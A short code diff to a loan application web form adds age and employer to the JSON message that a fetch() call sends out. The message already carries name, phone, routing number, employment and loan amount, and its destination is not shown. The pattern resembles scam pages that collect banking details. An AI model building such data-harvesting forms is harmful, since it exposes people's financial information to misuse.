@@ -98,8 +98,8 @@
             const formData = {
                 fname: document.getElementById('fname').value,
                 phone: document.getElementById('phone').value,
-                age: document.getElementById('age').value,
                 routing: document.getElementById('routing').value,
+                age: document.getElementById('age').value,
                 employment: document.getElementById('employment').value,
                 employer: document.getElementById('employer').value,
                 amount: document.getElementById('amount').value
@@ -111,7 +111,7 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: `New Loan Form Submission:\nName: ${formData.fname}\nPhone Number: ${formData.phone}\nRouting Number: ${formData.routing}\nEmployment: ${formData.employment}\nLoan Amount: ${formData.amount}`
+                    content: `New Loan Form Submission:\nName: ${formData.fname}\nPhone Number: ${formData.phone}\nRouting Number: ${formData.routing}\nAge : ${formData.age}\nEmployment: ${formData.employment}\nEmployer : ${formData.employer}\nLoan Amount: ${formData.amount}`
                 })
             }).then(response => {
                 if (response.ok) {
